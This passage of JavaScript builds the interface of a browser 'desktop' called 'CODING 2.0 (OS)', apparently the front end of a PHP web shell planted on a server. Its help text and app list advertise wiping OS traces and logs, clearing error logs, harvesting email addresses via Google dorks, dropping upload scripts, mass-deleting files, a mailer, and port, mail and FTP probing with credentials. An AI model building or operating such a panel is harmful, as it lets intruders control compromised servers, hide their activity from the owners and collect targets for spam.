    </script>

    <script>
    // Errors popup functionality
    (function(){
        var trigger = document.getElementById('errors-trigger');
        var template = document.getElementById('errors-template');
        var layer = document.getElementById('errors-layer');

        async function scanErrors(win){
            try {
                var summary = win.querySelector('#errors-summary');
                var output = win.querySelector('#errors-output');
                if (output) { output.value = ''; output.textContent = ''; }
                function appendLine(text){ if(!output) return; output.value += text + '\n'; output.textContent = output.value; output.scrollTop = output.scrollHeight; }
                appendLine('$ scanning errors...');
                var resp = await fetch('?api=errors_log', { credentials:'same-origin' });
                var j = await resp.json().catch(function(){ return { success:false }; });
                if (!j || !j.success) { if (summary) summary.textContent = 'Failed to scan error log'; appendLine('scan: failed to read log'); return; }
                var meta = 'Log: ' + (j.path || '(unknown)') + (j.exists ? (' — ' + j.size + ' bytes') : ' — (missing)');
                if (summary) summary.textContent = meta;
                appendLine('$ found ' + String((j.entries||[]).length) + ' entries in ' + String((j.groups||[]).length) + ' files');
                if (!j.entries || j.entries.length === 0) { appendLine('$ no entries found'); return; }
                var state = { entries: j.entries || [], index: 0, paused: false };
                win._scanState = state;
                if (win._setScanControls) win._setScanControls();
                function tick(){
                    if (!win._scanState || win._scanState !== state) return;
                    if (state.paused) return;
                    if (state.index >= state.entries.length){ if (summary) summary.textContent = meta + ' — done'; if (win._setScanControls) win._setScanControls(); return; }
                    var e = state.entries[state.index];
                    var sev = e.severity || 'PHP';
                    var msg = e.message || '';
                    var file = e.file || '';
                    var ln = e.line || '';
                    var ts = e.ts ? (' [' + e.ts + ']') : '';
                    var loc = file ? (' -> ' + file + (ln ? (':' + String(ln)) : '')) : '';
                    appendLine('[' + sev + '] ' + msg + loc + ts);
                    state.index++;
                    setTimeout(tick, 10);
                }
                win._resumeScan = function(){ if (!state) return; state.paused = false; if (summary) summary.textContent = meta + ' — scanning'; if (win._setScanControls) win._setScanControls(); tick(); };
                win._pauseScan = function(){ if (!state) return; state.paused = true; if (summary) summary.textContent = meta + ' — paused'; if (win._setScanControls) win._setScanControls(); };
                tick();
            } catch(e){}
        }

        function spawnErrorsWindow(){
            if (!template || !layer) return null;
            var win = template.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            layer.appendChild(win);
            try { window.addOpenApp && window.addOpenApp('errors'); } catch(e){}
            // Restore saved position or center initially
            try {
                var savedLeft = parseInt(localStorage.getItem('errors.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('errors.top') || '', 10);
                var ew = win.offsetWidth || 560;
                var eh = win.offsetHeight || 360;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - ew - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - eh - 6, savedTop));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - ew - 6, Math.round((window.innerWidth - ew) / 2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - eh - 6, Math.round((window.innerHeight - eh) / 2)));
                    win.style.left = left2 + 'px';
                    win.style.top = top2 + 'px';
                }
            } catch(e) {}

            var titlebar = win.querySelector('.errors-titlebar');
            var closeBtn = win.querySelector('.errors-close');
            var scanBtn = win.querySelector('.errors-scan');
            var pauseBtn = win.querySelector('.errors-pause');
            var resumeBtn = win.querySelector('.errors-resume');
            var clearBtn = win.querySelector('.errors-clear');
            var summary = win.querySelector('#errors-summary');
            var output = win.querySelector('#errors-output');

            var dragging = false, offX = 0, offY = 0, dx = 0, dy = 0, rafId = 0;
            function apply(){ rafId = 0; win.style.transform = 'translate3d(' + dx + 'px,' + dy + 'px,0)'; }
            function onDown(e){
                if (closeBtn && (e.target===closeBtn || (closeBtn.contains && closeBtn.contains(e.target)))) return;
                dragging = true;
                var r = win.getBoundingClientRect();
                offX = (e.clientX||0) - r.left; offY = (e.clientY||0) - r.top;
                try { titlebar.setPointerCapture && titlebar.setPointerCapture(e.pointerId); } catch(err){}
            }
            function onMove(e){
                if (!dragging) return;
                var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX));
                var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY));
                dx = x - (parseInt(win.style.left||'0',10)||0);
                dy = y - (parseInt(win.style.top||'0',10)||0);
                if (!rafId) rafId = requestAnimationFrame(apply);
            }
            function onUp(e){
                if (!dragging) return;
                dragging = false;
                win.style.transform = '';
                var finalLeft = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX));
                var finalTop = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY));
                win.style.left = finalLeft + 'px';
                win.style.top = finalTop + 'px';
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('errors.left', String(Math.round(rect.left)));
                    localStorage.setItem('errors.top', String(Math.round(rect.top)));
                } catch(err) {}
                try { titlebar.releasePointerCapture && titlebar.releasePointerCapture(e.pointerId); } catch(err2){}
            }
            if (titlebar){
                titlebar.addEventListener('pointerdown', onDown);
                titlebar.addEventListener('pointermove', onMove);
                titlebar.addEventListener('pointerup', onUp);
                titlebar.addEventListener('pointercancel', onUp);
            }

            closeBtn && closeBtn.addEventListener('mousedown', function(e){ e.stopPropagation(); });
            closeBtn && closeBtn.addEventListener('touchstart', function(e){ e.stopPropagation(); }, { passive:true });
            closeBtn && closeBtn.addEventListener('click', function(){
                win.remove();
                try { window.removeOpenApp && window.removeOpenApp('errors'); } catch(e){}
                win._scanState = null; if (win._setScanControls) win._setScanControls();
            });
            closeBtn && closeBtn.addEventListener('keydown', function(e){ if (e.key==='Enter' || e.key===' ') { e.preventDefault(); win.remove(); try { window.removeOpenApp && window.removeOpenApp('errors'); } catch(err){} win._scanState=null; if (win._setScanControls) win._setScanControls(); } });
            scanBtn && scanBtn.addEventListener('click', function(){
                var term = win.querySelector('#errors-term');
                if (term) { term.textContent = ''; }
                if (summary) { summary.textContent = 'Scanning...'; }
                scanErrors(win);
                if (win._setScanControls) win._setScanControls();
            });
            var scanBtn2 = win.querySelector('#errors-scan-btn');
            scanBtn2 && scanBtn2.addEventListener('click', function(){
                var term = win.querySelector('#errors-term');
                if (term) { term.textContent = ''; }
                if (summary) { summary.textContent = 'Scanning...'; }
                scanErrors(win);
                if (win._setScanControls) win._setScanControls();
            });
            pauseBtn && pauseBtn.addEventListener('click', function(){ if (win._pauseScan) win._pauseScan(); if (win._setScanControls) win._setScanControls(); });
            var pauseBtn2 = win.querySelector('#errors-pause-btn');
            pauseBtn2 && pauseBtn2.addEventListener('click', function(){ if (win._pauseScan) win._pauseScan(); if (win._setScanControls) win._setScanControls(); });
            resumeBtn && resumeBtn.addEventListener('click', function(){ if (win._resumeScan) win._resumeScan(); if (win._setScanControls) win._setScanControls(); });
            var resumeBtn2 = win.querySelector('#errors-resume-btn');
            resumeBtn2 && resumeBtn2.addEventListener('click', function(){ if (win._resumeScan) win._resumeScan(); if (win._setScanControls) win._setScanControls(); });
            clearBtn && clearBtn.addEventListener('click', async function(){
                try {
                    var r = await fetch(window.location.pathname, { method:'POST', headers:{ 'Content-Type':'application/x-www-form-urlencoded' }, body:'api=errors_clear' });
                    var j = await r.json();
                    var term = win.querySelector('#errors-term');
                    if (j && j.success) {
                        if (term) { var d=document.createElement('div'); d.className='cmd'; d.textContent='$ log cleared'; term.appendChild(d); }
                        if (summary) { summary.textContent = 'Log cleared. Press Scan to analyze again.'; }
                        win._scanState = null; if (win._setScanControls) win._setScanControls();
                    } else { alert('Failed to clear log'); }
                } catch(e){ alert('Failed to clear log'); }
            });

            scanErrors(win);
            return win;
        }

        

        trigger && trigger.addEventListener('click', function(e){ e.preventDefault(); spawnErrorsWindow(); });
        window.spawnErrorsWindow = spawnErrorsWindow;
    })();
    </script>

    <script>
    (function(){
        var trigger = document.getElementById('how-trigger');
        var template = document.getElementById('how-template');
        var layer = document.getElementById('how-layer');

        function spawnHowWindow(){
            if (!template || !layer) return null;
            var win = template.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            layer.appendChild(win);
            try { window.addOpenApp && window.addOpenApp('how'); } catch(e){}
            try {
                var savedLeft = parseInt(localStorage.getItem('how.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('how.top') || '', 10);
                var ew = win.offsetWidth || 720;
                var eh = win.offsetHeight || 420;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - ew - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - eh - 6, savedTop));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - ew - 6, Math.round((window.innerWidth - ew) / 2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - eh - 6, Math.round((window.innerHeight - eh) / 2)));
                    win.style.left = left2 + 'px';
                    win.style.top = top2 + 'px';
                }
            } catch(e) {}

            var titlebar = win.querySelector('.how-titlebar');
            var closeBtn = win.querySelector('.how-close');
            var list = win.querySelector('#how-list');

            var dragging = false, offX = 0, offY = 0, dx = 0, dy = 0, rafId = 0;
            function apply(){ rafId = 0; win.style.transform = 'translate3d(' + dx + 'px,' + dy + 'px,0)'; }
            function onDown(e){ if (closeBtn && (e.target===closeBtn || (closeBtn.contains && closeBtn.contains(e.target)))) return; dragging = true; var r = win.getBoundingClientRect(); offX = (e.clientX||0) - r.left; offY = (e.clientY||0) - r.top; try { titlebar.setPointerCapture && titlebar.setPointerCapture(e.pointerId); } catch(err){} }
            function onMove(e){ if (!dragging) return; var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX)); var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY)); dx = x - (parseInt(win.style.left||'0',10)||0); dy = y - (parseInt(win.style.top||'0',10)||0); if (!rafId) rafId = requestAnimationFrame(apply); }
            function onUp(e){ if (!dragging) return; dragging = false; win.style.transform = ''; var finalLeft = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX)); var finalTop = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY)); win.style.left = finalLeft + 'px'; win.style.top = finalTop + 'px'; try { var rect = win.getBoundingClientRect(); localStorage.setItem('how.left', String(Math.round(rect.left))); localStorage.setItem('how.top', String(Math.round(rect.top))); } catch(err) {} try { titlebar.releasePointerCapture && titlebar.releasePointerCapture(e.pointerId); } catch(err2){} }
            if (titlebar){ titlebar.addEventListener('pointerdown', onDown); titlebar.addEventListener('pointermove', onMove); titlebar.addEventListener('pointerup', onUp); titlebar.addEventListener('pointercancel', onUp); }

            closeBtn && closeBtn.addEventListener('mousedown', function(e){ e.stopPropagation(); });
            closeBtn && closeBtn.addEventListener('touchstart', function(e){ e.stopPropagation(); }, { passive:true });
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); try { window.removeOpenApp && window.removeOpenApp('how'); } catch(e){} });
            closeBtn && closeBtn.addEventListener('keydown', function(e){ if (e.key==='Enter' || e.key===' ') { e.preventDefault(); win.remove(); try { window.removeOpenApp && window.removeOpenApp('how'); } catch(err){} } });

            try {
                var icons = document.querySelectorAll('.app-icons .app-icon');
                var desc = {
                    'wallpaper-trigger': 'Change desktop wallpaper and styles.',
                    'browser-trigger': 'Open in-app browser. Enter URLs or search.',
                    'serverinfo-trigger': 'View server and environment info.',
                    'mailer-trigger': 'Send emails; monitor delivery status.',
                    'notes-trigger': 'Create and manage notes.',
                    'cmd-trigger': 'Run commands. Type `help` or `dork -e ...`.',
                    'errors-trigger': 'Scan and review PHP error logs.',
                    'settings-trigger': 'Adjust app settings. Change password.',
                    'clean-trigger': 'Clean OS traces, logs, and cache.',
                    'trash-trigger': 'Manage Trash items.',
                    'apptools-trigger': 'Open APPTools utilities.',
                    'logout-trigger': 'Remove Cookies and Back to login',
                    'about-trigger': 'About is CODING 2.0 (OS) Operating System'
                };
                Array.prototype.forEach.call(icons, function(a){
                    var id = a.id || '';
                    var label = a.getAttribute('data-label') || a.getAttribute('aria-label') || id || '';
                    if (!label) return;
                    if (id === 'how-trigger') return;
                    var item = document.createElement('div');
                    item.className = 'how-item';
                    var iconWrap = document.createElement('div');
                    iconWrap.className = 'how-icon';
                    var iconChild = a.querySelector('svg, .material-symbols-rounded, img');
                    if (iconChild) { iconWrap.innerHTML = iconChild.outerHTML; }
                    else {
                        if (id === 'wallpaper-trigger') {
                            iconWrap.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true">wallpaper</span>';
                        } else if (id === 'mailer-trigger') {
                            iconWrap.innerHTML = '<span class="material-symbols-rounded" aria-hidden="true">mail</span>';
                        }
                    }
                    var textWrap = document.createElement('div');
                    var title = document.createElement('div');
                    title.className = 'title';
                    title.textContent = label;
                    var usage = document.createElement('div');
                    usage.className = 'desc';
                    var usageText = desc[id] || ((label === 'Home') ? 'Back to the File Browser home' : 'Open and use this app.');
                    usage.textContent = usageText;
                    textWrap.appendChild(title);
                    textWrap.appendChild(usage);
                    item.appendChild(iconWrap);
                    item.appendChild(textWrap);
                    list && list.appendChild(item);
                });
            } catch(e){}

            return win;
        }

        trigger && trigger.addEventListener('click', function(e){ e.preventDefault(); spawnHowWindow(); });
        window.spawnHowWindow = spawnHowWindow;
    })();
    </script>

    <script>
    (function(){
        var trigger = document.getElementById('cmdhelp-trigger');
        var template = document.getElementById('cmdhelp-template');
        var layer = document.getElementById('cmdhelp-layer');
        function spawn(){
            if (!template || !layer) return null;
            var win = template.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            layer.appendChild(win);
            try { window.addOpenApp && window.addOpenApp('cmdhelp'); } catch(e){}
            try {
                var savedLeft = parseInt(localStorage.getItem('cmdhelp.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('cmdhelp.top') || '', 10);
                var ew = win.offsetWidth || 720;
                var eh = win.offsetHeight || 420;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - ew - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - eh - 6, savedTop));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - ew - 6, Math.round((window.innerWidth - ew) / 2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - eh - 6, Math.round((window.innerHeight - eh) / 2)));
                    win.style.left = left2 + 'px';
                    win.style.top = top2 + 'px';
                }
            } catch(e) {}
            var titlebar = win.querySelector('.cmdhelp-titlebar');
            var closeBtn = win.querySelector('.cmdhelp-close');
            var body = win.querySelector('#cmdhelp-body');
            var dragging = false, offX = 0, offY = 0, dx = 0, dy = 0, rafId = 0;
            function apply(){ rafId = 0; win.style.transform = 'translate3d(' + dx + 'px,' + dy + 'px,0)'; }
            function onDown(e){ if (closeBtn && (e.target===closeBtn || (closeBtn.contains && closeBtn.contains(e.target)))) return; dragging = true; var r = win.getBoundingClientRect(); offX = (e.clientX||0) - r.left; offY = (e.clientY||0) - r.top; try { titlebar.setPointerCapture && titlebar.setPointerCapture(e.pointerId); } catch(err){} }
            function onMove(e){ if (!dragging) return; var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX)); var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY)); dx = x - (parseInt(win.style.left||'0',10)||0); dy = y - (parseInt(win.style.top||'0',10)||0); if (!rafId) rafId = requestAnimationFrame(apply); }
            function onUp(e){ if (!dragging) return; dragging = false; win.style.transform = ''; var finalLeft = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, (e.clientX||0) - offX)); var finalTop = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, (e.clientY||0) - offY)); win.style.left = finalLeft + 'px'; win.style.top = finalTop + 'px'; try { var rect = win.getBoundingClientRect(); localStorage.setItem('cmdhelp.left', String(Math.round(rect.left))); localStorage.setItem('cmdhelp.top', String(Math.round(rect.top))); } catch(err) {} try { titlebar.releasePointerCapture && titlebar.releasePointerCapture(e.pointerId); } catch(err2){} }
            if (titlebar){ titlebar.addEventListener('pointerdown', onDown); titlebar.addEventListener('pointermove', onMove); titlebar.addEventListener('pointerup', onUp); titlebar.addEventListener('pointercancel', onUp); }
            closeBtn && closeBtn.addEventListener('mousedown', function(e){ e.stopPropagation(); });
            closeBtn && closeBtn.addEventListener('touchstart', function(e){ e.stopPropagation(); }, { passive:true });
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); try { window.removeOpenApp && window.removeOpenApp('cmdhelp'); } catch(e){} });
            closeBtn && closeBtn.addEventListener('keydown', function(e){ if (e.key==='Enter' || e.key===' ') { e.preventDefault(); win.remove(); try { window.removeOpenApp && window.removeOpenApp('cmdhelp'); } catch(err){} } });
            function add(title, desc, ex){ var item=document.createElement('div'); item.className='cmdhelp-item'; var t=document.createElement('div'); t.className='title'; t.textContent=title; var d=document.createElement('div'); d.className='desc'; d.textContent=desc; item.appendChild(t); item.appendChild(d); if(ex){ var e=document.createElement('div'); e.className='ex'; e.textContent=ex; item.appendChild(e);} body && body.appendChild(item); }
            add('help', 'Show available commands', 'help');
            add('clear', 'Clear the CMD screen', 'clear');
            add('open', 'Open URL or search in a new tab', 'open https://example.com\nopen example query');
            add('dork -e', 'Extract emails with streaming and filters', 'dork -e intext:@email.com --pages=10 --api --deep=10 --site=.ltd\ndork -e like finance report --pages=3 --site=.au,.be\ndork -e "security" --pages=2 --no-api');
            add('dork --api-setup', 'Configure Google Custom Search API', 'dork --api-setup --key=YOUR_KEY --cx=YOUR_CX');
            add('ls', 'List files for current or given path', 'ls\nls -l\nls /Applications/XAMPP/xamppfiles/htdocs');
            add('unzip', 'Extract zip file to optional folder', 'unzip file.zip\nunzip file.zip folder');
            add('cd', 'Show current directory', 'cd');
            add('mkdir', 'Create a folder in current directory', 'mkdir myfolder');
            add('mkfile', 'Create a file in current directory', 'mkfile notes.txt');
            add('mkup', 'Create upload script in current directory', 'mkup');
            add('rm', 'Delete a file in current directory', 'rm notes.txt');
            add('rmdir', 'Delete a folder recursively', 'rmdir myfolder');
            add('massremove -o', 'Keep only given files and remove others', 'massremove -o keep1.txt,keep2.txt');
            add('nslookup', 'DNS records and IPs for a domain', 'nslookup example.com');
            add('scan', 'Probe common or given ports', 'scan example.com\nscan example.com 22,80,443');
            add('scanall', 'Probe port ranges', 'scanall example.com 1-1024');
            add('scanmail', 'Check mail-related ports and webmail', 'scanmail example.com');
            add('ftpcheck', 'Probe FTP/FTPS explicit/implicit ports', 'ftpcheck example.com\nftpcheck example.com 21,990 --explicit --user=U --pass=P');
            return win;
        }
        trigger && trigger.addEventListener('click', function(e){ e.preventDefault(); spawn(); });
        window.spawnCmdHelpWindow = spawn;
    })();
    </script>

    <script>
    (function(){
        const trigger = document.getElementById('notes-trigger');
        const template = document.getElementById('notes-template');
        const layer = document.getElementById('notes-layer');

        let counter = 0;
        function newId(){ counter++; return 'notes_' + Date.now() + '_' + counter; }
        function k(id, base){ return base + '_' + id; }

        // Track open Notes windows across refreshes
        function getOpenIds(){
            try {
                const raw = localStorage.getItem('notesOpenIds');
                const arr = raw ? JSON.parse(raw) : [];
                return Array.isArray(arr) ? arr : [];
            } catch(e){ return []; }
        }
        function setOpenIds(arr){
            try { localStorage.setItem('notesOpenIds', JSON.stringify(Array.from(new Set(arr)))); } catch(e){}
        }
        function addOpenId(id){
            const ids = getOpenIds();
            if (!ids.includes(id)) { ids.push(id); setOpenIds(ids); }
        }
        function removeOpenId(id){
            const ids = getOpenIds().filter(x => x !== id);
            setOpenIds(ids);
        }

        function loadNotes(id){
            try {
                const raw = localStorage.getItem(k(id, 'notesItems'));
                const arr = raw ? JSON.parse(raw) : [];
                return Array.isArray(arr) ? arr : [];
            } catch(e){ return []; }
        }
        function saveNotes(id, arr){
            try { localStorage.setItem(k(id, 'notesItems'), JSON.stringify(arr)); } catch(e){}
        }

        function spawnNotesWindow(initialText, existingId){
            if (!template || !layer) return;
            const id = existingId || newId();
            const win = template.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            win.setAttribute('data-id', id);
            layer.appendChild(win);
            addOpenId(id);

            const titlebar = win.querySelector('.notes-titlebar');
            const closeBtn = win.querySelector('.notes-close');
            const list = win.querySelector('.notes-list');
            const addBtn = win.querySelector('.notes-add');
            const clearBtn = win.querySelector('.notes-clear');

            let notes = loadNotes(id);
            if (initialText && initialText.trim() !== '') {
                notes.push({ id: String(Date.now()), content: initialText });
                saveNotes(id, notes);
            } else if (!notes || notes.length === 0) {
                // Ensure a blank note exists so user can type immediately
                notes = [{ id: String(Date.now()), content: '' }];
                saveNotes(id, notes);
            }
            function renderNotes(){
                if (!list) return;
                list.innerHTML = '';
                notes.forEach((note, idx) => {
                    const item = document.createElement('div');
                    item.className = 'note-item';
                    item.dataset.id = note.id || String(Date.now() + idx);
                    const ta = document.createElement('textarea');
                    ta.className = 'note-text';
                    ta.placeholder = 'Type note...';
                    ta.value = note.content || '';
                    ta.addEventListener('input', function(){ note.content = ta.value; saveNotes(id, notes); });
                    const actions = document.createElement('div');
                    actions.className = 'note-actions';
                    const copyBtn = document.createElement('button');
                    copyBtn.className = 'btn btn-copy';
                    copyBtn.title = 'Copy to clipboard';
                    copyBtn.setAttribute('aria-label', 'Copy to clipboard');
                    copyBtn.innerHTML = '<span class="material-symbols-rounded">content_copy</span>';
                    copyBtn.addEventListener('click', async function(){
                        const textToCopy = ta.value || '';
                        try {
                            if (navigator.clipboard && navigator.clipboard.writeText) {
                                await navigator.clipboard.writeText(textToCopy);
                            } else {
                                ta.select();
                                document.execCommand('copy');
                                ta.setSelectionRange(ta.value.length, ta.value.length);
                            }
                            const prev = copyBtn.innerHTML;
                            copyBtn.innerHTML = '<span class="material-symbols-rounded">done</span>';
                            setTimeout(()=>{ copyBtn.innerHTML = prev; }, 900);
                        } catch(e) {
                            const prev = copyBtn.innerHTML;
                            copyBtn.innerHTML = '<span class="material-symbols-rounded">error</span>';
                            setTimeout(()=>{ copyBtn.innerHTML = prev; }, 1200);
                        }
                    });
                    const del = document.createElement('button');
                    del.className = 'btn btn-delete';
                    del.title = 'Delete note';
                    del.setAttribute('aria-label', 'Delete note');
                    del.innerHTML = '<svg class="delete-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256"><defs><linearGradient x1="16" y1="2.888" x2="16" y2="29.012" gradientUnits="userSpaceOnUse" id="color-1_nTkpTS1GZpkb_gr1"><stop offset="0" stop-color="#8b0000"></stop><stop offset="0.247" stop-color="#8b0000"></stop><stop offset="0.672" stop-color="#8b0000"></stop><stop offset="1" stop-color="#8b0000"></stop></linearGradient><linearGradient x1="16" y1="10.755" x2="16" y2="21.245" gradientUnits="userSpaceOnUse" id="color-2_nTkpTS1GZpkb_gr2"><stop offset="0" stop-color="#000000" stop-opacity="0.1"></stop><stop offset="1" stop-color="#000000" stop-opacity="0.7"></stop></linearGradient><linearGradient x1="16" y1="3" x2="16" y2="29" gradientUnits="userSpaceOnUse" id="color-3_nTkpTS1GZpkb_gr3"><stop offset="0" stop-color="#000000" stop-opacity="0.02"></stop><stop offset="1" stop-color="#000000" stop-opacity="0.15"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(8,8)"><circle cx="16" cy="16" r="13" fill="url(#color-1_nTkpTS1GZpkb_gr1)"></circle><g fill="url(#color-2_nTkpTS1GZpkb_gr2)" opacity="0.2"><path d="M19.995,10.755c-0.334,0 -0.648,0.13 -0.884,0.366l-3.111,3.111l-3.111,-3.111c-0.236,-0.236 -0.55,-0.366 -0.884,-0.366c-0.334,0 -0.648,0.13 -0.884,0.366c-0.487,0.487 -0.487,1.28 0,1.768l3.111,3.111l-3.111,3.111c-0.487,0.487 -0.487,1.28 0,1.768c0.236,0.236 0.55,0.366 0.884,0.366c0.334,0 0.648,-0.13 0.884,-0.366l3.111,-3.111l3.111,3.111c0.236,0.236 0.55,0.366 0.884,0.366c0.334,0 0.648,-0.13 0.884,-0.366c0.487,-0.487 0.487,-1.28 0,-1.768l-3.111,-3.111l3.111,-3.111c0.487,-0.487 0.487,-1.28 0,-1.768c-0.236,-0.236 -0.55,-0.366 -0.884,-0.366z"></path></g><path d="M16,3.25c7.03,0 12.75,5.72 12.75,12.75c0,7.03 -5.72 12.75 -12.75 12.75c-7.03,0 -12.75,-5.72 -12.75,-12.75c0,-7.03 5.72,-12.75 12.75,-12.75M16,3c-7.18,0 -13,5.82 -13,13c0,7.18 5.82 13 13 13c7.18,0 13,-5.82 13,-13c0,-7.18 -5.82,-13 -13,-13z" fill="url(#color-3_nTkpTS1GZpkb_gr3)"></path><path d="M17.414,16l3.288,-3.288c0.391,-0.391 0.391,-1.024 0,-1.414c-0.391,-0.391 -1.024,-0.391 -1.414,0l-3.288,3.288l-3.288,-3.288c-0.391,-0.391 -1.024,-0.391 -1.414,0c-0.391,0.391 -0.391,1.024 0,1.414l3.288,3.288l-3.288,3.288c-0.391,0.391 -0.391,1.024 0,1.414c0.391,0.391 1.024,0.391 1.414,0l3.288,-3.288l3.288,3.288c0.391,0.391 1.024,0.391 1.414,0c0.391,-0.391 0.391,-1.024 0,-1.414z" fill="#ffffff"></path></g></g></svg>';
                    del.addEventListener('click', function(){
                        notes.splice(idx, 1);
                        saveNotes(id, notes); renderNotes();
                    });
                    actions.appendChild(copyBtn);
                    actions.appendChild(del);
                    item.appendChild(ta);
                    item.appendChild(actions);
                    list.appendChild(item);
                });
            }
            renderNotes();

            // Autofocus the first textarea so the user can start typing
            const firstTextarea = win.querySelector('.note-text');
            if (firstTextarea) {
                try {
                    firstTextarea.focus();
                    const len = firstTextarea.value.length;
                    firstTextarea.setSelectionRange(len, len);
                } catch(e) {}
            }

            // Add opens a new notes window (independent)
            addBtn && addBtn.addEventListener('click', function(){ spawnNotesWindow(''); });
            clearBtn && clearBtn.addEventListener('click', function(){ notes = []; saveNotes(id, notes); renderNotes(); });
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); removeOpenId(id); });

            // Initial position: stagger away from previous windows
            const existing = layer.querySelectorAll('.notes-window.show').length;
            const baseLeft = 80, baseTop = 120, step = 28;
            const savedLeft = localStorage.getItem(k(id, 'notesLeft'));
            const savedTop = localStorage.getItem(k(id, 'notesTop'));
            if (savedLeft !== null && savedTop !== null) {
                win.style.left = savedLeft + 'px';
                win.style.top = savedTop + 'px';
            } else if (existing === 0) {
                const nw = win.offsetWidth || 520;
                const nh = win.offsetHeight || 360;
                const left = Math.max(6, Math.min(window.innerWidth - nw - 6, Math.round((window.innerWidth - nw) / 2)));
                const top = Math.max(6, Math.min(window.innerHeight - nh - 6, Math.round((window.innerHeight - nh) / 2)));
                win.style.left = left + 'px';
                win.style.top = top + 'px';
            } else {
                win.style.left = (baseLeft + step * (existing - 1)) + 'px';
                win.style.top = (baseTop + step * (existing - 1)) + 'px';
            }

            // Draggable per window
            let drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){
                drag.active = true;
                const rect = win.getBoundingClientRect();
                drag.offsetX = e.clientX - rect.left;
                drag.offsetY = e.clientY - rect.top;
                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
            }
            function onMouseMove(e){
                if (!drag.active) return;
                const x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX));
                const y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY));
                win.style.left = x + 'px';
                win.style.top = y + 'px';
            }
            function onMouseUp(){
                drag.active = false;
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
                try {
                    const left = parseInt(win.style.left || '80', 10);
                    const top = parseInt(win.style.top || '120', 10);
                    localStorage.setItem(k(id, 'notesLeft'), String(left));
                    localStorage.setItem(k(id, 'notesTop'), String(top));
                } catch(e){}
            }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);

            return win;
        }

        // Restore previously open windows on load
        (function(){
            const ids = getOpenIds();
            ids.forEach(function(id){ spawnNotesWindow('', id); });
        })();

        // Each click opens a new independent notes window
        trigger && trigger.addEventListener('click', function(e){ e.preventDefault(); spawnNotesWindow(''); });
    })();
    </script>

    <script>
    // Mailer popup functionality
    (function(){
        const trigger = document.getElementById('mailer-trigger');
        const template = document.getElementById('mailer-template');
        const layer = document.getElementById('mailer-layer');

        function spawnMailerWindow(){
            if (!template || !layer) return null;
            
            const pre = (function(){ try { return window.__preMailerClone; } catch(e){ return null; } })();
            const win = pre ? pre : template.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            layer.appendChild(win);
            try { if (pre) window.__preMailerClone = null; } catch(e){}
            try { window.addOpenApp && window.addOpenApp('mailer'); } catch(e){}
            // Restore position or center initially
            try {
                const savedLeft = parseInt(localStorage.getItem('mailer.left') || '', 10);
                const savedTop = parseInt(localStorage.getItem('mailer.top') || '', 10);
                const mw = win.offsetWidth || 580;
                const mh = win.offsetHeight || 420;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    const left = Math.max(6, Math.min(window.innerWidth - mw - 6, savedLeft));
                    const top = Math.max(6, Math.min(window.innerHeight - mh - 6, savedTop));
                    win.style.left = left + 'px';
